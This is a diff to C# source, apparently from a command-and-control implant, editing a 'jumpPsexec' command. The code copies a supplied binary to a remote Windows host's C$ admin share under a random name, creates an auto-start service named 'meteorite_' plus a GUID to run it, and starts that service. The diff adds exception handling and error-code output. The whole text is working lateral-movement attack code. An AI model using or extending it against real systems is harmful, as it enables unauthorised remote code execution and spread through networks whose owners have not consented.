@@ -86,50 +86,61 @@ namespace Engineer.Commands
 
         public static void jumpPsexec(string target, byte[] binary)
         {
-            // open the service maanger on the target machine and create a new service with a random name that is set to run the binary and then start the service
-            IntPtr serviceManagerHandle = WinAPIs.Advapi.OpenSCManager(target, null, WinAPIs.Advapi.SC_MANAGER_ALL_ACCESS);
-            if (serviceManagerHandle == IntPtr.Zero)
+            try
             {
-                Console.WriteLine("error: " + "Failed to open service manager on target machine");
-                return;
+                // open the service maanger on the target machine and create a new service with a random name that is set to run the binary and then start the service
+                IntPtr serviceManagerHandle = WinAPIs.Advapi.OpenSCManager(target, null, WinAPIs.Advapi.SC_MANAGER_ALL_ACCESS);
+                if (serviceManagerHandle == IntPtr.Zero)
+                {
+                    Console.WriteLine("error: " + "Failed to open service manager on target machine");
+                    return;
+                }
+                // split the binary path into the directory and the binary name, copy the binary name over to the target machine windows directory
+
+                //create random name for the binary
+                string binaryName = Path.GetRandomFileName();
+                //remove the random file ending and place .exe on the end of the name
+                binaryName = binaryName.Remove(binaryName.Length - 4) + ".exe";
+
+                string targetBinaryDirectory = $"\\\\{target}" + "\\C$\\Windows\\" + binaryName;
+                File.WriteAllBytes(targetBinaryDirectory, binary);
+                //check if the file exists on the target machine, if it does not exist then return an error
+                if (!File.Exists(targetBinaryDirectory))
+                {
+                    Console.WriteLine("error: " + "Failed to copy binary to target machine");
+                    return;
+                }
+                Console.WriteLine("Copied binary to target machine");
+                string targetBinary = targetBinaryDirectory;
+
+
+                string serviceName = "meteorite_" + Guid.NewGuid().ToString();
+                IntPtr serviceHandle = WinAPIs.Advapi.CreateService(serviceManagerHandle, serviceName, serviceName, WinAPIs.Advapi.SERVICE_NO_CHANGE, WinAPIs.Advapi.SERVICE_WIN32_OWN_PROCESS, WinAPIs.Advapi.SERVICE_AUTO_START, WinAPIs.Advapi.SERVICE_ERROR_NORMAL, targetBinary, null, null, null, null, null);
+                if (serviceHandle == IntPtr.Zero)
+                {
+                    Console.WriteLine("error: " + "Failed to create service on target machine");
+                    Console.WriteLine(Marshal.GetLastWin32Error());
+                    return;
+                }
+                if (WinAPIs.Advapi.StartService(serviceHandle, 0, null) == false)
+                {
+                    Console.WriteLine("error: " + "Failed to start service on target machine");
+                    return;
+                }
+                Console.WriteLine("Successfully created service on target machine");
+                Console.WriteLine("Successfully started service on target machine");
+                // close the service manager
+                WinAPIs.Advapi.CloseServiceHandle(serviceManagerHandle);
+                // close the service
+                WinAPIs.Advapi.CloseServiceHandle(serviceHandle);
+
             }
-            // split the binary path into the directory and the binary name, copy the binary name over to the target machine windows directory
-
-            //create random name for the binary
-            string binaryName = Path.GetRandomFileName();
-            //remove the random file ending and place .exe on the end of the name
-            binaryName = binaryName.Remove(binaryName.Length - 4) + ".exe";
-
-            string targetBinaryDirectory = $"\\\\{target}" + "\\C$\\Windows\\" + binaryName;
-            File.WriteAllBytes(targetBinaryDirectory, binary);
-            //check if the file exists on the target machine, if it does not exist then return an error
-            if (!File.Exists(targetBinaryDirectory))
+            catch (Exception e)
             {
-                Console.WriteLine("error: " + "Failed to copy binary to target machine");
-                return;
+                Console.WriteLine(e.Message);
+                Console.WriteLine(e.StackTrace);
             }
-            Console.WriteLine("Copied binary to target machine");
-            string targetBinary = targetBinaryDirectory;
-
-
-            string serviceName = "meteorite_" + Guid.NewGuid().ToString();
-            IntPtr serviceHandle = WinAPIs.Advapi.CreateService(serviceManagerHandle, serviceName, serviceName, WinAPIs.Advapi.SERVICE_NO_CHANGE, WinAPIs.Advapi.SERVICE_WIN32_OWN_PROCESS, WinAPIs.Advapi.SERVICE_AUTO_START, WinAPIs.Advapi.SERVICE_ERROR_NORMAL, targetBinary, null, null, null, null, null);
-            if (serviceHandle == IntPtr.Zero)
-            {
-                Console.WriteLine("error: " + "Failed to create service on target machine");
-                return;
-            }
-            if (WinAPIs.Advapi.StartService(serviceHandle, 0, null) == false)
-            {
-                Console.WriteLine("error: " + "Failed to start service on target machine");
-                return;
-            }
-            Console.WriteLine("Successfully created service on target machine");
-            Console.WriteLine("Successfully started service on target machine");
-            // close the service manager
-            WinAPIs.Advapi.CloseServiceHandle(serviceManagerHandle);
-            // close the service
-            WinAPIs.Advapi.CloseServiceHandle(serviceHandle);
+           
 
         }
 
